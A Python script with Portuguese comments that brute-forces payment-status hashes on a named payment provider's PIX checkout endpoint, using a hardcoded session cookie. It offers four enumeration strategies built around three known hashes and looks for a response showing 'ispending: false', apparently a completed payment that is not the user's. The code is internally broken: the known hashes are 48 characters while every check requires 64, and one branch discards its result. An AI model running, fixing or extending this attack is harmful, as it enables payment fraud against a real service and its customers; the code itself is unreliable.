import requests
import time
import json
from datetime import datetime
import itertools
from collections import deque

# ============================================
# CONFIGURAÇÕES
# ============================================
BASE_URL = "https://customer.ebanx.com"
STATUS_ENDPOINT = "/pix/checkout/getPaymentStatus"

HEADERS = {
    "Host": "customer.ebanx.com",
    "Cookie": "__cf_bm=nGkP_LOs1J83Kit87wlAl5LeH4V1go_PEC_AkMpt_OY-1782672251.6494856-1.0.1.1-nATFnykkNVojAa0lNEJDbA7lit6cawEhG9bl8Q4Y7ayQRp_R8LzAhTywV7lcL5i2OzlHd8w.bZoxV2bgkBLHRx.bhf1EtUjbezrm72vdD9cUGCviuvH_XDgaypqO3Xdy",
    "Accept": "*/*",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Referer": "https://customer.ebanx.com/pix/checkout"
}

# ============================================
# HASHS CONHECIDAS
# ============================================
KNOWN_HASHES = [
    "6a416b79f43f0c881edb7eb901d8aab23cd8dfc427df6c94",
    "6a416be1befe3e2ea19198e612694573212b26daceeec0bf",
    "6a416d3dc907ac03f18df2faeb355016cd3ca6bfbe3712be"
]

# Verifica tamanhos
print("📊 Verificando tamanhos das hashes:")
for i, h in enumerate(KNOWN_HASHES, 1):
    print(f"  Hash {i}: {len(h)} caracteres")
    if len(h) != 64:
        print(f"  ⚠️  Hash {i} tem {len(h)} caracteres (deveria ser 64)")

# ============================================
# FUNÇÃO CORRIGIDA - ESTRATÉGIA 2
# ============================================
def estrategia_padroes():
    """Foca em padrões observados nas hashes conhecidas"""
    print("🚀 ESTRATÉGIA 2: BASEADA EM PADRÕES")
    print("=" * 70)
    
    # Verifica se todas as hashes têm o mesmo tamanho
    tamanhos = [len(h) for h in KNOWN_HASHES]
    if len(set(tamanhos)) != 1:
        print(f"❌ Hashes com tamanhos diferentes: {tamanhos}")
        print("   Usando a primeira hash como referência")
        base_hash = KNOWN_HASHES[0]
        tamanho_ref = len(base_hash)
    else:
        tamanho_ref = tamanhos[0]
        base_hash = KNOWN_HASHES[0]
    
    print(f"📊 Tamanho da hash: {tamanho_ref}")
    print(f"📊 Hash base: {base_hash}")
    print()
    
    # Analisa padrões
    padroes = []
    for pos in range(tamanho_ref):
        try:
            chars = [h[pos] for h in KNOWN_HASHES]
            if len(set(chars)) == 1:
                padroes.append((pos, chars[0], 'fixo'))
            else:
                padroes.append((pos, chars, 'variavel'))
        except IndexError:
            print(f"⚠️  Erro na posição {pos} - hash pode ser menor")
            continue
    
    # Mostra posições fixas
    fixas = [p for p in padroes if p[2] == 'fixo']
    variaveis = [p for p in padroes if p[2] == 'variavel']
    
    print(f"📊 Posições fixas: {len(fixas)}")
    print(f"📊 Posições variáveis: {len(variaveis)}")
    
    # Mostra prefixo fixo
    prefixo = base_hash[:6]
    print(f"📊 Prefixo fixo: {prefixo}")
    print()
    
    # Gera combinações baseadas nas posições variáveis
    chars = '0123456789abcdef'
    
    # Foca nas primeiras N posições variáveis (limitado para não explodir)
    num_posicoes = min(3, len(variaveis))  # Começa com 3 posições
    pos_var = [p[0] for p in variaveis[:num_posicoes]]
    
    print(f"🔹 Variando {num_posicoes} posições: {pos_var}")
    print(f"📊 Total de combinações: {16**num_posicoes}")
    print()
    
    found = None
    tested = 0
    
    for combinacao in itertools.product(chars, repeat=num_posicoes):
        if found:
            break
        
        # Cria nova hash baseada na base
        nova_hash = list(base_hash)
        for i, pos in enumerate(pos_var):
            nova_hash[pos] = combinacao[i]
        nova_hash = ''.join(nova_hash)
        
        # Verifica se tem 64 caracteres
        if len(nova_hash) != 64:
            continue
        
        status = check_hash_status(nova_hash)
        tested += 1
        
        if status:
            is_pending = status.get('ispending')
            if is_pending is not None:
                if is_pending == False:
                    print(f"\n🎉🎉🎉 ENCONTRADO! ispending: false")
                    print(f"📋 Hash: {nova_hash}")
                    print(f"📋 Resposta: {json.dumps(status, indent=2, ensure_ascii=False)}")
                    found = nova_hash
                    break
                else:
                    # Mostra apenas a cada 10 testes
                    if tested % 10 == 0:
                        print(f"📋 [{tested}] {nova_hash[:16]}... ispending: true")
        
        # Progresso
        if tested % 50 == 0:
            print(f"⏳ Testadas {tested} combinações...")
    
    return found

# ============================================
# FUNÇÃO VERIFICAR HASH
# ============================================
def check_hash_status(hash_value):
    """Verifica o status de uma hash"""
    if len(hash_value) != 64:
        return None
    
    url = f"{BASE_URL}{STATUS_ENDPOINT}?hash={hash_value}"
    
    try:
        response = requests.get(url, headers=HEADERS, timeout=3)
        
        if response.status_code == 200:
            try:
                data = response.json()
                return data
            except:
                return None
        else:
            return None
            
    except Exception as e:
        return None

# ============================================
# ESTRATÉGIA 1: VARIAÇÃO CONTROLADA (CORRIGIDA)
# ============================================
def estrategia_variacao_controlada():
    """Varia poucas posições por vez, mantendo o padrão"""
    print("🚀 ESTRATÉGIA 1: VARIAÇÃO CONTROLADA")
    print("=" * 70)
    print("Variando 2 posições por vez para não explodir o número de combinações")
    print()
    
    base_hash = KNOWN_HASHES[2]  # Usa a hash que sabemos que funciona
    chars = '0123456789abcdef'
    
    # Verifica tamanho
    if len(base_hash) != 64:
        print(f"❌ Hash com tamanho incorreto: {len(base_hash)}")
        return None
    
    # Posições para variar (evita o prefixo fixo)
    posicoes = list(range(6, 64))  # Começa depois do prefixo "6a416b"
    
    found = None
    tested = 0
    max_tests = 500  # Limite para não sobrecarregar
    
    # Testa variação de 2 posições
    for i in range(len(posicoes)):
        if found:
            break
        
        for j in range(i + 1, len(posicoes)):
            if found:
                break
            
            pos1 = posicoes[i]
            pos2 = posicoes[j]
            
            for char1 in chars:
                if found:
                    break
                if char1 == base_hash[pos1]:
                    continue
                    
                for char2 in chars:
                    if found:
                        break
                    if char2 == base_hash[pos2]:
                        continue
                    
                    if tested >= max_tests:
                        print(f"⏹️  Limite de {max_tests} testes atingido")
                        return found
                    
                    # Cria nova hash
                    nova_hash = list(base_hash)
                    nova_hash[pos1] = char1
                    nova_hash[pos2] = char2
                    nova_hash = ''.join(nova_hash)
                    
                    # Verifica
                    status = check_hash_status(nova_hash)
                    tested += 1
                    
                    if status:
                        is_pending = status.get('ispending')
                        if is_pending is not None:
                            if is_pending == False:
                                print(f"\n🎉🎉🎉 ENCONTRADO! ispending: false")
                                print(f"📋 Hash: {nova_hash}")
                                print(f"📋 Resposta: {json.dumps(status, indent=2, ensure_ascii=False)}")
                                found = nova_hash
                                break
                            else:
                                if tested % 20 == 0:
                                    print(f"📋 [{tested}] {nova_hash[:16]}... ispending: true")
                    
                    # Progresso
                    if tested % 50 == 0:
                        print(f"⏳ Testadas {tested} combinações...")
    
    return found

# ============================================
# ESTRATÉGIA 3: BRUTE FORCE INTELIGENTE
# ============================================
def estrategia_brute_force_inteligente():
    """Brute force com foco em encontrar ispending: false"""
    print("🚀 ESTRATÉGIA 3: BRUTE FORCE INTELIGENTE")
    print("=" * 70)
    print("Testa combinações aleatórias com prefixo fixo")
    print()
    
    import random
    
    prefixo = "6a416b"
    chars = '0123456789abcdef'
    
    found = None
    tested = 0
    max_tests = 1000  # Limite de segurança
    
    while tested < max_tests and not found:
        # Gera hash aleatória com prefixo fixo
        resto = ''.join(random.choice(chars) for _ in range(58))
        nova_hash = prefixo + resto
        
        # Garante 64 caracteres
        if len(nova_hash) != 64:
            continue
        
        status = check_hash_status(nova_hash)
        tested += 1
        
        if status:
            is_pending = status.get('ispending')
            if is_pending is not None:
                if is_pending == False:
                    print(f"\n🎉🎉🎉 ENCONTRADO! ispending: false")
                    print(f"📋 Hash: {nova_hash}")
                    print(f"📋 Resposta: {json.dumps(status, indent=2, ensure_ascii=False)}")
                    found = nova_hash
                    break
                else:
                    if tested % 50 == 0:
                        print(f"📋 [{tested}] {nova_hash[:16]}... ispending: true")
        
        if tested % 100 == 0:
            print(f"⏳ Testadas {tested} hashes aleatórias...")
    
    return found

# ============================================
# ESTRATÉGIA 4: ANÁLISE DE PREFIXO
# ============================================
def estrategia_prefixo():
    """Testa variações apenas no prefixo"""
    print("🚀 ESTRATÉGIA 4: VARIAÇÃO DE PREFIXO")
    print("=" * 70)
    
    base_hash = KNOWN_HASHES[2]
    sufixo = base_hash[6:]  # Mantém o sufixo fixo
    chars = '0123456789abcdef'
    
    print(f"📋 Sufixo fixo: {sufixo[:20]}...")
    print()
    
    found = None
    tested = 0
    max_tests = 100
    
    # Varia as primeiras 6 posições (prefixo)
    for i in range(6):
        if found:
            break
        
        for char in chars:
            if found:
                break
            
            if tested >= max_tests:
                break
            
            nova_hash = base_hash[:i] + char + base_hash[i+1:]
            
            if len(nova_hash) != 64:
                continue
            
            status = check_hash_status(nova_hash)
            tested += 1
            
            if status:
                is_pending = status.get('ispending')
                if is_pending is not None and is_pending == False:
                    print(f"\n🎉🎉🎉 ENCONTRADO! ispending: false")
                    print(f"📋 Hash: {nova_hash}")
                    print(f"📋 Resposta: {json.dumps(status, indent=2, ensure_ascii=False)}")
                    found = nova_hash
                    break
    
    return found

# ============================================
# EXECUÇÃO PRINCIPAL
# ============================================
def main():
    print("=" * 80)
    print("🔍 BRUTE FORCE - HASHES EBANX (CORRIGIDO)")
    print("=" * 80)
    print()
    
    print("📊 Hashes conhecidas:")
    for i, h in enumerate(KNOWN_HASHES, 1):
        print(f"  {i}. {h}")
        print(f"     Tamanho: {len(h)} caracteres")
    print()
    
    print("🎯 Objetivo: Encontrar hash com ispending: false")
    print()
    
    print("Escolha a estratégia:")
    print("  1 - Variação controlada (2 posições) - RECOMENDADO")
    print("  2 - Baseada em padrões observados")
    print("  3 - Brute force inteligente (aleatório)")
    print("  4 - Variação de prefixo")
    print("  5 - Testar hashes específicas")
    print()
    
    choice = input("Opção (1-5): ").strip()
    print()
    
    start_time = time.time()
    
    if choice == '1':
        result = estrategia_variacao_controlada()
    elif choice == '2':
        result = estrategia_padroes()
    elif choice == '3':
        result = estrategia_brute_force_inteligente()
    elif choice == '4':
        result = estrategia_prefixo()
    elif choice == '5':
        hashes_input = input("Digite as hashes separadas por vírgula: ").strip()
        hashes = [h.strip() for h in hashes_input.split(',')]
        for h in hashes:
            print(f"\n📋 Verificando: {h}")
            if len(h) != 64:
                print(f"  ⚠️  Tamanho incorreto: {len(h)} caracteres")
                continue
            status = check_hash_status(h)
            if status:
                print(f"  Resposta: {json.dumps(status, indent=2, ensure_ascii=False)}")
                if status.get('ispending') == False:
                    print(f"  🎉 ispending: false encontrado!")
                    result = h
                    break
        result = None
    else:
        print("❌ Opção inválida! Usando estratégia 1.")
        result = estrategia_variacao_controlada()
    
    elapsed = time.time() - start_time
    
    print("\n" + "=" * 80)
    print("📊 RESULTADO")
    print("=" * 80)
    
    if result:
        print(f"\n✅✅✅ SUCESSO! ispending: false encontrado!")
        print(f"  🆔 Hash: {result}")
        print(f"  ⏱️  Tempo: {elapsed:.1f}s")
    else:
        print(f"\n❌ Nenhuma hash com ispending: false encontrada")
        print(f"  ⏱️  Tempo: {elapsed:.1f}s")
        print("\n💡 DICAS:")
        print("  • Tente outra estratégia (recomendo a 1)")
        print("  • Aumente o número de tentativas")
        print("  • As hashes podem estar expiradas")
        print("  • Use a opção 5 para testar hashes específicas")
    
    print("=" * 80)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n⚠️  Interrompido pelo usuário!")